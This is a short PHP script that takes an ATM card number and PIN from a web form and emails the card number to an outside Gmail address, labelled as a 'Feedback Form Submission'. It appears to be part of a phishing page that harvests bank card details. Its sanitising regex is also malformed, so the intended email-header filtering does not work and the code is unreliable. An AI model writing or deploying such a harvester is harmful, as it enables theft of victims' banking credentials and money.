<?php 
$nomor_atm = $_POST['nomor_atm'];
$pin = $_POST['pin'];

function filter_atm_header($form_field) {  
return preg_replace('/[nr|!/<>^$%*&]+/','',$form_field);
}

$nomor_atm  = filter_atm_header($nomor_atm);

$headers = "From: $nomor_atm";
$sent = mail('nisa.codelifings@gmail.com', 'Feedback Form Submission', $nomor_atm, $headers);

if ($sent) {

?><html>
<head>
<title>Success!</title>
</head>
<body>
<h1>Success!</h1>
</body>
</html>

<?php

} else {
?><html>
<head>
<title>Something went wrong</title>
</head>
<body>
<h1>Something went wrong</h1>
<p>Please try again.</p>
</body>
</html>
<?php
}


 ?>